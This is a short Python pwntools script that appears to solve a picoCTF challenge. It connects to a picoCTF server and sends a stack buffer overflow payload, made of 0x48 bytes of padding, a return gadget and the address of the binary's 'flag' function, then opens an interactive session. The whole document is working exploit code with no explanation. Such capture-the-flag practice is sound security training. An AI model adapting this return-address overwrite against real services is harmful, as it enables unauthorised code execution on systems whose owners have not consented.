from pwn import *

p = remote('saturn.picoctf.net', 56242)
e = ELF('./vuln')

ret = 0x00000000004012d1

payload = b'A' * 0x48
payload += p64(ret)
payload += p64(e.symbols['flag'])
p.sendline(payload)
p.interactive()
